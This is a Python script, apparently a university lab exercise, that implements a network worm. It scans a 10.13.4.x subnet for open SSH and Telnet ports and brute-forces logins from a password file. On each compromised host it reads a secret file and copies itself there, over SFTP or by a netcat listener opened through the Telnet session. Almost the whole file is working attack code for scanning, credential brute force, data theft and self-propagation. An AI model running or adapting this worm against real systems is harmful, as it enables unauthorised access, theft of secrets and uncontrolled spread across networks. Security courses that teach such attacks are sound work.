import time
import socket
import paramiko
import telnetlib
import subprocess
from pathlib import Path


def find_vulnerable_machines():
    SUBNET = "10.13.4."
    SSH_PORT = 22
    TELNET_PORT = 23

    SSH_ADDRESS_LOG = Path("open_ssh.log")
    TELNET_ADDRESS_LOG = Path("open_telnet.log")

    ssh_addresses = get_open_addresses(SSH_ADDRESS_LOG, SUBNET, SSH_PORT)
    telnet_addresses = get_open_addresses(TELNET_ADDRESS_LOG, SUBNET, TELNET_PORT)
    return ssh_addresses, telnet_addresses

def get_open_addresses(log_path, subnet, port):
    if log_path.exists():
        with open(log_path, "r") as f:
            addresses = f.read().split("\n")
        return addresses
    
    addresses = []
    for i in range(256):
        ip_address = f"{subnet}{i}"
        print(f"\rChecking {ip_address}", end="")
        if is_open_address(ip_address, port):
            addresses.append(ip_address)
    print()
    
    with open(log_path, "w") as f:
        f.write("\n".join(addresses)) 
    return addresses 

def is_open_address(ip_address, port):
    is_open = False
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((ip_address, port))
    except (OSError, TimeoutError):
        pass
    else:
        is_open = True
    finally:
        s.close()
        return is_open


def find_vulnerable_accounts(ssh_addresses, telnet_addresses):
    with open("/home/cse/Lab2/Q2pwd", "r") as f:
        logins = [l.split() for l in f.read().split("\n")[:-1]]
    
    ssh_creds = get_ssh_creds(ssh_addresses, logins)
    telnet_creds = get_telnet_creds(telnet_addresses, logins)
    return ssh_creds, telnet_creds

def get_ssh_creds(ssh_addresses, logins):
    SSH_CRED_LOG = Path("ssh_accounts.log")
    if SSH_CRED_LOG.exists():
        with open(SSH_CRED_LOG, "r") as f:
            ssh_creds = [l.split(",") for l in f.read().split("\n")]
        return ssh_creds

    ssh_creds = []
    ssh_client = paramiko.client.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for i, address in enumerate(ssh_addresses):
        print(f"\rChecking ssh address {i+1}/{len(ssh_addresses)}")
        for username, password in logins:
            try:
                ssh_client.connect(address, username=username, password=password)
            except Exception as e:
                print(e)
            else:
                print(address, username, password)
                ssh_creds.append((address, username, password)) 
    ssh_client.close()

    with open(SSH_CRED_LOG, "w") as f:
        f.write("\n".join(f"{a},{u},{p}" for (a,u,p) in ssh_creds))
    return ssh_creds

def get_telnet_creds(telnet_addresses, logins):
    TELNET_CRED_LOG = Path("telnet_accounts.log")
    if TELNET_CRED_LOG.exists():
        with open(TELNET_CRED_LOG, "r") as f:
            telnet_creds = [l.split(",") for l in f.read().split("\n")]
        return telnet_creds

    telnet_creds = []
    for i, address in enumerate(telnet_addresses):
        print(f"\rChecking telnet address {i+1}/{len(telnet_addresses)}")
        for username, password in logins:
            tn = telnetlib.Telnet(address)
            tn.read_until(b"login: ")
            tn.write(username.encode("ascii") + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode("utf-8") + b"\n")
            ans = tn.read_until(b"Welcome", timeout=0.25)
            tn.close()

            if b"Welcome" in ans:
                print(address, username, password)
                telnet_creds.append((address, username, password))

    with open(TELNET_CRED_LOG, "w") as f:
        f.write("\n".join(f"{a},{u},{p}" for (a,u,p) in telnet_creds))
    return telnet_creds


def extract_and_infect(ssh_creds, telnet_creds):
    secrets = exploit_ssh(ssh_creds)
    secrets += exploit_telnet(telnet_creds)
    
    with open("extracted_secrets.log", "w") as f:
        f.write("\n".join(f"{a},{u},{s}" for (a,u,s) in secrets))

def exploit_ssh(ssh_creds):
    ssh_client = paramiko.client.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    secrets = []
    for address, username, password in ssh_creds:
        ssh_client.connect(address, username=username, password=password, banner_timeout=5)
        sftp = ssh_client.open_sftp()
        
        with sftp.file("Q2secret") as f:
            secrets.append((address, username, f.read().decode().rstrip("\n")))
        sftp.put("Q2worm.py", "Q2worm.py")

    ssh_client.close()
    return secrets

def exploit_telnet(telnet_creds):
    secrets = []
    for address, username, password in telnet_creds:
        tn = telnetlib.Telnet(address)
        tn.read_until(b"login: ")
        tn.write(username.encode("ascii") + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode("ascii") + b"\n")
        
        tn.read_until(b"$")
        tn.write(b"nc -l -p 1234 > Q2worm.py\n")
        subprocess.run(f"nc -w 5 {address} 1234 < Q2worm.py", shell=True)
        
        tn.read_until(b"$")
        tn.write(b"cat Q2secret\n")
        tn.read_until(b"\n")
        secret = tn.read_until(b"\r\n").decode().strip()
        secrets.append((address, username, secret))
        tn.close()
    return secrets

if __name__ == "__main__":
    t0 = time.time()
  
    ssh_addresses, telnet_addresses = find_vulnerable_machines()
    ssh_creds, telnet_creds = find_vulnerable_accounts(ssh_addresses, telnet_addresses)
    extract_and_infect(ssh_creds, telnet_creds)
    
    dt = time.time() - t0
    print(f"\nProgram runtime: {dt} sec.")

